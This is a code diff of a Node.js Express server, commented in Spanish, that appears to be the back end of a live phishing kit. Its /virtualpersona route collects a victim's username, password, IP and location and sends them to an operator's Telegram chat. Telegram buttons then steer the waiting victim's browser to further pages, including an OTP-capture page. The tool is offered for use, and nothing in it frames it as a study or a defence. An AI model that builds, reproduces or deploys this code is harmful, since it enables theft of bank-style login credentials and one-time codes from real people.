@@ -1,5 +1,3 @@
-// ✅ server.js para Virtual-Persona + loading.html funcionando con flujo dinámico
-
 const express = require("express");
 const bodyParser = require("body-parser");
 const fetch = require("node-fetch");
@@ -11,28 +9,34 @@ const TelegramBot = require("node-telegram-bot-api");
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// 🧠 Memoria temporal para instrucciones por sessionId
+// 🧠 Memoria en RAM para instrucciones de redirección
 const instrucciones = new Map();
 
-// ✅ Inicializar bot en modo polling
+// ✅ Inicializar el bot en modo polling
 const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
-bot.deleteWebhook(); // importante para que funcione en modo polling
+bot.deleteWebhook(); // necesario para usar polling
 
 // Middlewares
 app.use(cors());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.static("public")); // <-- sirve archivos estáticos como HTML, CSS, JS
 
-// ✅ Ruta para recibir datos desde Virtual-Persona.html
+// ✅ Ruta principal para probar el servidor
+app.get("/", (req, res) => {
+  res.send("✅ Servidor activo");
+});
+
+// ✅ Ruta para recibir datos del formulario Virtual-Persona.html
 app.post("/virtualpersona", async (req, res) => {
   try {
     const { user, pass, ip, location } = req.body;
     const sessionId = uuidv4();
     const [city, country] = location.split(",");
 
-    const text = `🔒 NUEVO INGRESO VIRTUAL 🔒\n\n👤 Usuario: ${user}\n🔑 Clave: ${pass}\n🌎 IP: ${ip} (${city.trim()}, ${country.trim()})\n🧾 SessionID: ${sessionId}`;
+    const mensaje = `🔒 NUEVO INGRESO VIRTUAL 🔒\n\n👤 Usuario: ${user}\n🔑 Clave: ${pass}\n🌎 IP: ${ip} (${city.trim()}, ${country.trim()})\n🧾 SessionID: ${sessionId}`;
 
-    const buttons = {
+    const botones = {
       inline_keyboard: [
         [
           { text: "❌ Error Logo", callback_data: `error_logo|${sessionId}` },
@@ -44,9 +48,8 @@ app.post("/virtualpersona", async (req, res) => {
       ],
     };
 
-    // Enviar mensaje a Telegram
-    await bot.sendMessage(process.env.CHAT_ID, text, {
-      reply_markup: buttons,
+    await bot.sendMessage(process.env.CHAT_ID, mensaje, {
+      reply_markup: botones,
     });
 
     res.json({ success: true, sessionId });
@@ -56,23 +59,22 @@ app.post("/virtualpersona", async (req, res) => {
   }
 });
 
-// ✅ Ruta para el polling de instrucciones desde loading.html
+// ✅ Ruta de polling desde loading.html
 app.get("/instruction/:sessionId", (req, res) => {
   const sessionId = req.params.sessionId;
   const accion = instrucciones.get(sessionId);
 
   if (accion) {
-    instrucciones.delete(sessionId);
+    instrucciones.delete(sessionId); // limpiar para evitar múltiples redirecciones
     res.json({ redirect_to: obtenerRuta(accion) });
   } else {
-    res.json({ redirect_to: null });
+    res.json({ redirect_to: null }); // seguir esperando
   }
 });
 
-// ✅ Recibir la acción desde botones de Telegram
+// ✅ Manejar botones desde Telegram
 bot.on("callback_query", async (query) => {
   const [accion, sessionId] = query.data.split("|");
-
   if (!sessionId) return;
 
   instrucciones.set(sessionId, accion);
@@ -84,12 +86,7 @@ bot.on("callback_query", async (query) => {
   });
 });
 
-// ✅ Ruta principal de prueba
-app.get("/", (req, res) => {
-  res.send("✅ Servidor activo");
-});
-
-// Función que define a qué redirigir según el botón presionado
+// Función que define a qué ruta redirigir según el botón
 function obtenerRuta(accion) {
   switch (accion) {
     case "error_logo":
@@ -99,11 +96,11 @@ function obtenerRuta(accion) {
     case "siguiente":
       return "/otp-check.html";
     default:
-      return "/"; // fallback
+      return "/";
   }
 }
 
-// Inicializar servidor
+// Iniciar servidor
 app.listen(PORT, () => {
   console.log(`🚀 Servidor activo en puerto ${PORT}`);
 });
